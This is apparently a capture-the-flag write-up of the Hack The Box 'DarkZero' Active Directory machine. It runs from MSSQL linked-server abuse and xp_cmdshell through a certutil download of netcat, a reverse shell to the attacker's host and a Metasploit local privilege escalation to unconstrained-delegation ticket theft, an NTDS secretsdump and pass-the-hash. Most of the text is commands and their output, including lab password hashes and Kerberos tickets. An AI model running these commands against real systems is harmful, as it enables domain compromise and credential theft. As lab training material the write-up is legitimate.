---
title: "HTB DarkZero"
date: 2026-01-04 11:00:00 +1100
categories: [Hack The Box]
tags: [
  Active Directory,
  Kerberos,
  SMB,
  BloodHound,
  Unconstrained Delegation,
  MSSQL,
  Linked Servers,
  NTDS.dit,
  secretsdump,
]
---

# DarkZero

![image.png](https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/78acdd0d87ed629f6cd2dc378bdcddac.png)

As is common in real life pentests, you will start the DarkZero box with credentials for the following account john.w / RFulUtONCOL!

# Nmap

```shell
─$ nmap -sC -sV -T4 10.129.244.69
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-05 01:44 UTC
Nmap scan report for 10.129.244.69
Host is up (0.33s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-05 08:46:07Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
|_ssl-date: TLS randomness does not represent time
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-05T08:46:52
|_  start_date: N/A
|_clock-skew: 7h01m17s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.22 seconds

```

I also did a full port scan and found a database

```shell
└─$ nmap --open -T4 10.129.244.69 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-05 01:46 UTC
Nmap scan report for 10.129.244.69
Host is up (0.33s latency).
Not shown: 986 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1433/tcp open  ms-sql-s
2179/tcp open  vmrdp
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman

```
# MSSQL Linked DB
Let's enumerate the database. base

nothing much is happening on the DB. However there is a linked server

```shell
mssqlclient.py darkzero.htb/john.w:'RFulUtONCOL!'@10.129.244.69 -windows-auth
SQL (darkzero\john.w  guest@master)> enum_links
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      

DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      

Linked Server       Local Login       Is Self Mapping   Remote Login   
-----------------   ---------------   ---------------   ------------   
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc   
```

We can see the user on the other database

```shell
SQL (darkzero\john.w  guest@master)> EXEC ('SELECT SYSTEM_USER, USER_NAME()') AT [DC02.darkzero.ext];
            
---   ---   
dbo   dbo   

SQL (darkzero\john.w  guest@master)> 

```

Let's see if we can get code execution

```shell
SQL (darkzero\john.w  guest@master)> EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];
INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (darkzero\john.w  guest@master)> EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];
INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (darkzero\john.w  guest@master)> EXEC ('xp_cmdshell ''whoami''') AT [DC02.darkzero.ext];
output                 
--------------------   
darkzero-ext\svc_sql   

NULL                   

SQL (darkzero\john.w  guest@master)> 
SQL (darkzero\john.w  guest@master)> 
```

We have code exectuion so lets get a shell.

```shell
QL (darkzero\john.w  guest@master)> EXEC ('xp_cmdshell "certutil -urlcache -split -f http://10.10.14.8:8000/nc64.exe C:\Windows\Temp\nc64.exe"') AT [DC02.darkzero.ext];

output                                                
---------------------------------------------------   
****  Online  ****                                    

  0000  ...                                           

  b0d8                                                

CertUtil: -URLCache command completed successfully.   

NULL                                                  

SQL (darkzero\john.w  guest@master)> 
SQL (darkzero\john.w  guest@master)> EXEC ('xp_cmdshell "C:\Windows\Temp\nc64.exe -e cmd.exe 10.10.14.8 4444"') AT [DC02.darkzero.ext];
```
# Metasploit Exploit Suggester

We can get a Meterpreter shell and run an exploit suggester

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.8 LPORT=5555 -f exe -o shell.exe
 
C:\Users\svc_sql>certutil -urlcache -split -f http://10.10.14.8:8000/shell.exe C:\Users\svc_sql\shell.exe

certutil -urlcache -split -f http://10.10.14.8:8000/shell.exe C:\Users\svc_sql\shell.exe
****  Online  ****
  0000  ...
  1c00
CertUtil: -URLCache command completed successfully.

C:\Users\svc_sql\shell.exe
shell.exe

C:\Users\svc_sql>
sf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                  Connection
  --  ----  ----                     -----------                  ----------
  4         meterpreter x64/windows  darkzero-ext\svc_sql @ DC02  10.10.14.2:5555 -> 10.129.244
                                                                  .69:51188 (172.16.20.2)

msf6 exploit(multi/handler) > sessions -i 4
[*] Starting interaction with 4...

meterpreter > run post/multi/recon/local_exploit_suggester
[*] 172.16.20.2 - Collecting local exploits for x64/windows...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add syslog to your Gemfile or gemspec to silence this warning.
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
[*] 172.16.20.2 - 205 exploit checks are being tried...
[+] 172.16.20.2 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 172.16.20.2 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 172.16.20.2 - exploit/windows/local/cve_2022_21882_win32k: The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2022
[+] 172.16.20.2 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
[+] 172.16.20.2 - exploit/windows/local/cve_2023_28252_clfs_driver: The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default
[+] 172.16.20.2 - exploit/windows/local/cve_2024_30085_cloud_files: The target appears to be vulnerable.
[+] 172.16.20.2 - exploit/windows/local/cve_2024_30088_authz_basep: The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113
[+] 172.16.20.2 - exploit/windows/local/cve_2024_35250_ks_driver: The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022
[+] 172.16.20.2 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[*] Running check method for exploit 49 / 49
[*] 172.16.20.2 - Valid modules for session 4:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.                                                                 
 2   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.                                                                 
 3   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2022                                                                                  
 4   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.                                                                 
 5   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default                                              
 6   exploit/windows/local/cve_2024_30085_cloud_files               Yes                      The target appears to be vulnerable.                                                                 
 7   exploit/windows/local/cve_2024_30088_authz_basep               Yes                      The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113                                                                                            
 8   exploit/windows/local/cve_2024_35250_ks_driver                 Yes                      The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022
 9   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.  
```

We can use the auth_base

```shell
msf6 exploit(windows/local/cve_2024_30088_authz_basep) > run
[*] Started reverse TCP handler on 10.10.14.2:6666 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113
[*] Reflectively injecting the DLL into 4896...
[+] The exploit was successful, reading SYSTEM token from memory...
[+] Successfully stole winlogon handle: 816
[+] Successfully retrieved winlogon pid: 600
[*] Sending stage (203846 bytes) to 10.129.244.69
[*] Meterpreter session 6 opened (10.10.14.2:6666 -> 10.129.244.69:51224) at 2025-10-05 17:41:55 +1100

meterpreter > shell
Process 3124 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.2113]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

```

We can do a hashdump

```shell
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404eeaad3b435b51404ee:6963aad8ba1150192f3ca6341355eb49:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:43e27ea2be22babce4fbcff3bc409a9d:::
svc_sql:1103:aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f:::
DC02$:1000:aad3b435b51404eeaad3b435b51404ee:663a13eb19800202721db4225eadc38e:::
darkzero$:1105:aad3b435b51404eeaad3b435b51404ee:4276fdf209008f4988fa8c33d65a2f94:::
```

# Unconstrained Delegation 

We can also check if this computer has unconstried delegation enabled

```shell
PS C:\> Import-Module .\PowerView.ps1
Import-Module .\PowerView.ps1
PS C:\>  Get-DomainComputer -Unconstrained
 Get-DomainComputer -Unconstrained

pwdlastset                    : 7/29/2025 7:21:59 AM
logoncount                    : 426
msds-generationid             : {121, 127, 59, 192...}
serverreferencebl             : CN=DC02,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=darkzero,DC=
                                ext
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=DC02,OU=Domain Controllers,DC=darkzero,DC=ext
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 10/2/2025 11:33:53 AM
name                          : DC02
primarygroupid                : 516
objectsid                     : S-1-5-21-1969715525-31638512-2552845157-1000
samaccountname                : DC02$

```

Now that we are an admin, we can run Rubeus, and since  there is unconstrained delegation on dc02 we can authenticate from dc01 to dc02 and get a tgt. 
Lets recap and understand why unconstrained delegation is dangerous

Unconstrained delegation is an Active Directory setting that allows a computer account (like DC02$) to impersonate users to any service after they authenticate to it. In simple terms: if a user (or another machine like DC01$) connects to a server that has unconstrained delegation enabled, that server can end up caching the user’s Kerberos TGT in memory so it can request service tickets on the user’s behalf later.

* If we get admin/SYSTEM on a machine with unconstrained delegation (like DC02), we can monitor for incoming authentications and steal TGTs as they appear.
* A stolen TGT can then be used to authenticate as that principal without knowing their password (pass-the-ticket style).

```shell
Rubeus.exe monitor /interval:1 /nowrap
```

Since there is unconstrained delegation on dc02, we can authenticate from dc01 to dc02 and get a tgt

```shell
└─$ mssqlclient.py darkzero.htb/john.w:'RFulUtONCOL!'@10.129.244.174 -windows-auth

Impacket v0.13.0.dev0+20250904.2110.6864c8b4 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)> xp_dirtree \\DC02.darkzero.ext\sfsdafasd
subdirectory   depth   file   
------------   -----   ----   
SQL (darkzero\john.w  guest@master)> 

```

Now, if we go back to Rubeus, we should see a tgt

```shell
[*] 10/8/2025 4:50:56 AM UTC - Found new TGT:

  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  10/7/2025 9:50:56 PM
  EndTime               :  10/8/2025 7:50:56 AM
  RenewTill             :  10/14/2025 9:50:56 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDYzlnOVPXESUgq6fYVRrlh3Q6seVk1twju8JwMl4AFL/m+cOkFHmIwk61rK+7yHFDjV/U1gkFa9sCBYisETGBGLP9v36nh4Ai7QX+GMSvsxCOpfvshUbnLPNGX0kIISI5ey49ImXwHmLTGwQRtbUdcj3TS0KTSUP6Ej5alu5dEOxaAf5287xrUMWtT4kjuIl1Qm064CDtpHHaEI8mlQlYs0s7HkYM09PZ++X2Mxn9O/ge1p2Ap7zq5brV2rx8aQnrugTQqT18l19kWSH4gSHtr2dPoOywHkZojk1fbuzkI1+NKWvwC8WYst0MM9ZR9bTGvUwuhIYlva/BlO7Y/nSX+zcaAtVtzuJ0JMlbL9ei6XttFkKjT10r78xlEgWqF6OQEMZmkOlCZSNdU0aB3JKMBpkrzIh0weg6c8uazR6S+/GXDiow6oA1bNR0KAShdCFKE7s/5LpF7oppLh45C97nXJqQfrT1iVx6X4T7VVConEbHNfDGIuR0Ff1bxN+DzQp22i6oAmL7ANjBwV3GiXfxre5vhsySvCauylFS/8YJfVJ/bnsGItEhsxdZ2HJb13eawearky+dxU2AExgsM0bElOJiUdWUUWSz8xZkinLU2UQL/zsh+M025h5wXbzo1xEmzD5mw//382ccJ/lu6xW7Uk5S2+t9akilIHaQmtLJJ4oOgzuqh21lNYMlynWylWcjsI48v/0Cvx/fTPIjACeGXwFuhclzAOetArxH+klzkGWMIAWex7udME3YNEM/jVrKW1gdEqCd1G/Cpxnfbs+hJBcgyxV743t/C4lL/VkiYmchrNzk0gaaFwjcVp4jRz1HLLdrFHPZK5yrKSKySa++rtvOStjGWsA/lz90VTf8nlnDBqH7vkhjBONLAhN7PgvX1wVlDTCy+I2BiPiPHRinv6aKVD7vaN6zKq+nChIO+eK0fKU66h3Uy2tuoe6mt9BEqYiw2kmtLzkZdsCHriakWwOgP359HHgRmzJX0HuGxhop21EEBR1Pab3AyndMl9qpdxCPqOH6X0QlgoFyhmiP0ORbEU86diD1LsQJR/cTg9jAMPpCLMZavtEH15tSm0omhlSpEEaFXxVWIrB2pAPdflSjZ5v7da8C36CXK0uD5AzMLxBJW9EElnQJRt02FbycZ5jj1pTZCPMOLmJi7CDZSxBjXPUOBGp/LgNu6Aaz6c4qwpzpChwwTc5oFBFQ96bnDjAr3H5K6ecULsb2olmU2FJrxSH0yxFudNGr9ST/kK1TXjI3erHUaqT3c0vtww5pywm4NE7jk+sIJDO+ihWNd6ooZgYbtj//ecNLfIbgc0UjHwmqacLk5jJ94S36dLFdbfkGzMLsdKA3qlnMyG5dWlMD+1uJlXyaAb5hDlq5twb2hQxxDRg7X9bMmvuEo5dx6RbsEjPzwo7/c2Om34ArsTSQEDhhQro4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgjsFVMQF4zUdhqGVU495/N+piIsZQmbUHsp6fcpBt3JuhDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEwMDgwNDUwNTZaphEYDzIwMjUxMDA4MTQ1MDU2WqcRGA8yMDI1MTAxNTA0NTA1NlqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=
```

Now let's get it into a valid format

```shell
└─$ cat > dc01.tgt.b64 << 'EOF'
doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDYzlnOVPXESUgq6fYVRrlh3Q6seVk1twju8JwMl4AFL/m+cOkFHmIwk61rK+7yHFDjV/U1gkFa9sCBYisETGBGLP9v36nh4Ai7QX+GMSvsxCOpfvshUbnLPNGX0kIISI5ey49ImXwHmLTGwQRtbUdcj3TS0KTSUP6Ej5alu5dEOxaAf5287xrUMWtT4kjuIl1Qm064CDtpHHaEI8mlQlYs0s7HkYM09PZ++X2Mxn9O/ge1p2Ap7zq5brV2rx8aQnrugTQqT18l19kWSH4gSHtr2dPoOywHkZojk1fbuzkI1+NKWvwC8WYst0MM9ZR9bTGvUwuhIYlva/BlO7Y/nSX+zcaAtVtzuJ0JMlbL9ei6XttFkKjT10r78xlEgWqF6OQEMZmkOlCZSNdU0aB3JKMBpkrzIh0weg6c8uazR6S+/GXDiow6oA1bNR0KAShdCFKE7s/5LpF7oppLh45C97nXJqQfrT1iVx6X4T7VVConEbHNfDGIuR0Ff1bxN+DzQp22i6oAmL7ANjBwV3GiXfxre5vhsySvCauylFS/8YJfVJ/bnsGItEhsxdZ2HJb13eawearky+dxU2AExgsM0bElOJiUdWUUWSz8xZkinLU2UQL/zsh+M025h5wXbzo1xEmzD5mw//382ccJ/lu6xW7Uk5S2+t9akilIHaQmtLJJ4oOgzuqh21lNYMlynWylWcjsI48v/0Cvx/fTPIjACeGXwFuhclzAOetArxH+klzkGWMIAWex7udME3YNEM/jVrKW1gdEqCd1G/Cpxnfbs+hJBcgyxV743t/C4lL/VkiYmchrNzk0gaaFwjcVp4jRz1HLLdrFHPZK5yrKSKySa++rtvOStjGWsA/lz90VTf8nlnDBqH7vkhjBONLAhN7PgvX1wVlDTCy+I2BiPiPHRinv6aKVD7vaN6zKq+nChIO+eK0fKU66h3Uy2tuoe6mt9BEqYiw2kmtLzkZdsCHriakWwOgP359HHgRmzJX0HuGxhop21EEBR1Pab3AyndMl9qpdxCPqOH6X0QlgoFyhmiP0ORbEU86diD1LsQJR/cTg9jAMPpCLMZavtEH15tSm0omhlSpEEaFXxVWIrB2pAPdflSjZ5v7da8C36CXK0uD5AzMLxBJW9EElnQJRt02FbycZ5jj1pTZCPMOLmJi7CDZSxBjXPUOBGp/LgNu6Aaz6c4qwpzpChwwTc5oFBFQ96bnDjAr3H5K6ecULsb2olmU2FJrxSH0yxFudNGr9ST/kK1TXjI3erHUaqT3c0vtww5pywm4NE7jk+sIJDO+ihWNd6ooZgYbtj//ecNLfIbgc0UjHwmqacLk5jJ94S36dLFdbfkGzMLsdKA3qlnMyG5dWlMD+1uJlXyaAb5hDlq5twb2hQxxDRg7X9bMmvuEo5dx6RbsEjPzwo7/c2Om34ArsTSQEDhhQro4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgjsFVMQF4zUdhqGVU495/N+piIsZQmbUHsp6fcpBt3JuhDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEwMDgwNDUwNTZaphEYDzIwMjUxMDA4MTQ1MDU2WqcRGA8yMDI1MTAxNTA0NTA1NlqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=
EOF
```

Convert it from b64, use the ticket converter, then export it

```shell
 base64 -d dc01.tgt.b64 > dc01.kirbi
 ticketConverter.py dc01.kirbi Administrator.ccache
export KRB5CCNAME=Administrator.ccache
```

Check if it's in the cache

```shell
──(kali㉿kali)-[~/boxes/darkzero]
└─$ klist
Ticket cache: FILE:Administrator.ccache
Default principal: DC01$@DARKZERO.HTB

Valid starting       Expires              Service principal
10/08/2025 15:50:56  10/09/2025 01:50:56  krbtgt/DARKZERO.HTB@DARKZERO.HTB
        renew until 10/15/2025 15:50:56                                                                           
```

and dump the secrets

```shell
─$ impacket-secretsdump -k -no-pass 'darkzero.htb/DC01$@DC01.darkzero.htb'

Impacket v0.13.0.dev0+20250904.2110.6864c8b4 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:64f4771e4c60b8b176c3769300f6f3f7:::
john.w:2603:aad3b435b51404eeaad3b435b51404ee:44b1b5623a1446b5831a7b3a4be3977b:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:d02e3fe0986e9b5f013dad12b2350b3a:::
darkzero-ext$:2602:aad3b435b51404eeaad3b435b51404ee:95e4ba6219aced32642afa4661781d4b:::
[*] Kerberos keys grabbed
Administrator:0x14:2f8efea2896670fa78f4da08a53c1ced59018a89b762cbcf6628bd290039b9cd
Administrator:0x13:a23315d970fe9d556be03ab611730673
Administrator:aes256-cts-hmac-sha1-96:d4aa4a338e44acd57b857fc4d650407ca2f9ac3d6f79c9de59141575ab16cabd
Administrator:aes128-cts-hmac-sha1-96:b1e04b87abab7be2c600fc652ac84362
Administrator:0x17:5917507bdf2ef2c2b0a869a1cba40726
krbtgt:aes256-cts-hmac-sha1-96:6330aee12ac37e9c42bc9af3f1fec55d7755c31d70095ca1927458d216884d41
krbtgt:aes128-cts-hmac-sha1-96:0ffbe626519980a499cb85b30e0b80f3
krbtgt:0x17:64f4771e4c60b8b176c3769300f6f3f7
john.w:0x14:f6d74915f051ef9c1c085d31f02698c04a4c6804d509b7c4442e8593d6d957ea
john.w:0x13:7b145a89aed458eaea530a2bd1eb93bd
john.w:aes256-cts-hmac-sha1-96:49a6d3404e9d19859c0eea1036f6e95debbdea99efea4e2c11ee529add37717e
john.w:aes128-cts-hmac-sha1-96:87d9cbd84d85c50904eba39d588e47db
john.w:0x17:44b1b5623a1446b5831a7b3a4be3977b
DC01$:aes256-cts-hmac-sha1-96:25e1e7b4219c9b414726983f0f50bbf28daa11dd4a24eed82c451c4d763c9941
DC01$:aes128-cts-hmac-sha1-96:9996363bffe713a6777597c876d4f9db
DC01$:0x17:d02e3fe0986e9b5f013dad12b2350b3a
darkzero-ext$:aes256-cts-hmac-sha1-96:eec6ace095e0f3b33a9714c2a23b19924542ba13a3268ea6831410020e1c11f3
darkzero-ext$:aes128-cts-hmac-sha1-96:3efb8a66f0a09fbc6602e46f22e8fc1c
darkzero-ext$:0x17:95e4ba6219aced32642afa4661781d4b
[*] Cleaning up... 

```

Let's get the flag

```shell
─(kali㉿kali)-[~/boxes/darkzero]
└─$ netexec smb darkzero.htb -u Administrator -H 5917507bdf2ef2c2b0a869a1cba40726 -x 'type C:\users\Administrator\Desktop\root.txt' 
SMB         10.129.244.174  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False)
SMB         10.129.244.174  445    DC01             [+] darkzero.htb\Administrator:5917507bdf2ef2c2b0a869a1cba40726 (Pwn3d!)
SMB         10.129.244.174  445    DC01             [+] Executed command via wmiexec
SMB         10.129.244.174  445    DC01             d193b00ea2a014aa63b1b2ede1bd6a87
                                                                                                 
